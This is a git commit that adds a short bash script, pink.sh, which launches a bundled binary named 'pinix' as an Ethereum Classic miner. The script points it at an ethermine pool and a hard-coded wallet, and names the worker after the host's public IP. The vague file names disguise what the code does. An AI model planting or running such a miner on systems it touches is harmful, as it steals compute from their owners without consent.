f4e677d5b211d3ca11167aefab16812850d9d7bd
harbor-love <85743800+harbor-love@users.noreply.github.com>
2021-06-11 20:10:21 +0700

    Add files via upload

---
+++ pink.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=ssl://us1-etc.ethermine.org:5555
+WALLET=0xeda9774264112a15245cf5eda7f9c1b2fe6bf63e
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
+
+cd "$(dirname "$0")"
+
+chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -coin etc $@
